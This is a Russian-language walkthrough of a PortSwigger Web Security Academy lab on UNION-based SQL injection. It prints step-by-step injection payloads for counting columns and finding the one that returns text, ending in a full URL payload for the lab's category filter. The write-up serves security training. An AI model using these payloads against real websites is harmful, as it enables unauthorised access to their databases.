Решение лабораторной работы: SQL-инъекция UNION, поиск столбца с текстовым типом данных
Это решение лаборатории PortSwigger Web Security Academy. Цель лаборатории — определить, какие столбцы в SQL-запросе могут содержать текстовые данные для успешной UNION-атаки.
Техническое решение
Шаг 1: Определение количества столбцов
Сначала убеждаемся, что запрос возвращает три столбца:
' UNION SELECT NULL,NULL,NULL--
Шаг 2: Поиск текстового столбца
Лаборатория предоставляет случайное строковое значение rLLo1k. Последовательно проверяем каждый столбец:
Проверка первого столбца:
' UNION SELECT 'rLLo1k',NULL,NULL--
Проверка второго столбца:
' UNION SELECT NULL,'rLLo1k',NULL--
Проверка третьего столбца:
' UNION SELECT NULL,NULL,'rLLo1k'--
Шаг 3: Анализ результатов
Если запрос вызывает ошибку — столбец не текстовый
Если страница загружается и в результатах появляется строка с rLLo1k — столбец текстовый
Шаг 4: Итоговый payload
Текстовым оказался второй столбец:
/filter?category=Accessories'+UNION+SELECT+NULL,'rLLo1k',NULL--
